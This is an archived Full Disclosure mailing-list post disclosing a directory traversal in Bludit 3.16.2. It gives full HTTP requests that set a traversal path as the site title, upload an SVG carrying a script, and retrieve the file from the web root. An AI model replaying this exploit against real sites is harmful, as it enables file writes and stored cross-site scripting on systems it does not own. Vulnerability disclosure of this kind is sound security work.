---
title: Directory Traversal "Site Title" - bluditv3.16.2
url: https://seclists.org/fulldisclosure/2025/Jul/3
source: Full Disclosure
date: 2025-07-09
fetch_date: 2025-10-06T23:55:55.760024
---

# Directory Traversal "Site Title" - bluditv3.16.2

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

![](/shared/images/nst-icons.svg#search)

# Directory Traversal "Site Title" - bluditv3.16.2

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 6 Jul 2025 22:51:50 +0100

---

```
# Exploit Title: Directory Traversal "Site Title" - bluditv3.16.2
# Date: 07/2025
# Exploit Author: Andrey Stoykov
# Version: 3.16.2
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Directory Traversal "Site Title" #1:

Steps to Reproduce:

1. Login with admin account and "General" > "General"
2. Set the "Site Title" to the following payload "../../../malicious"
3. Next click on "Logo" and the upload the SVG file

// HTTP POST Request

POST /bludit/admin/settings HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0)
Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 1208
Origin: http://192.168.58.133
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.58.133/bludit/admin/settings
Cookie: BLUDIT-KEY=re283ptc2s1pd9emfuqhiulto2
Upgrade-Insecure-Requests: 1
Priority: u=0, i

[...]title=htdocs/bludit/bl-content/uploads/../../../malicious[...]

// HTTP Response

HTTP/1.1 301 Moved Permanently
Date: Sat, 28 Jun 2025 21:27:33 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
[...]

// HTTP POST Request Uploading SVG File

POST /bludit/admin/ajax/logo-upload HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0)
Gecko/20100101 Firefox/141.0
[...]

------geckoformboundaryb7a89b3d43771e77a278c9384a361332
Content-Disposition: form-data; name="tokenCSRF"

59fc6f48ad5d60b39699491cada2390e1b42531b
------geckoformboundaryb7a89b3d43771e77a278c9384a361332
Content-Disposition: form-data; name="inputFile";
filename="evilsvgfile-xss-bypass.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="100" height="100" version="1.1" xmlns="
http://www.w3.org/2000/svg";>
  <script type="text/javascript">alert('xss');</script>
</svg>
------geckoformboundaryb7a89b3d43771e77a278c9384a361332--

// HTTP Response

HTTP/1.1 200 OK
Date: Sat, 28 Jun 2025 21:28:21 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
[...]

{"status":0,"message":"Image
uploaded.","filename":"..\/..\/..\/malicious.svg","absoluteURL":"http:\/\/
192.168.58.133
\/bludit\/bl-content\/uploads\/..\/..\/..\/malicious.svg","absolutePath":"\/opt\/lampp\/htdocs\/bludit\/bl-content\/uploads\/..\/..\/..\/malicious.svg"}

root@debian:/opt/lampp/htdocs# ls -lah
total 16K
drwxrwxrwx  3 root   root   4.0K Jun 28 17:28 .
drwxr-xr-x 31 root   root   4.0K Jun  3 16:26 ..
drwxrwxrwx  7 debian debian 4.0K Aug 25  2024 bludit
-rw-r--r--  1 daemon daemon  283 Jun 28 17:28 malicious.svg

// HTTP GET Request Accessing the SVG File

GET /malicious.svg?time=0.3289154512636364 HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0)
Gecko/20100101 Firefox/141.0
[...]

// HTTP Response

HTTP/1.1 200 OK
Date: Sat, 28 Jun 2025 21:28:21 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
Last-Modified: Sat, 28 Jun 2025 21:28:21 GMT
ETag: W/"11b-638a8794da6e3"
Accept-Ranges: bytes
Content-Length: 283
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="100" height="100" version="1.1" xmlns="
http://www.w3.org/2000/svg";>
  <script type="text/javascript">alert('xss');</script>
</svg>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

### Current thread:

* **Directory Traversal "Site Title" - bluditv3.16.2** *Andrey Stoykov (Jul 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")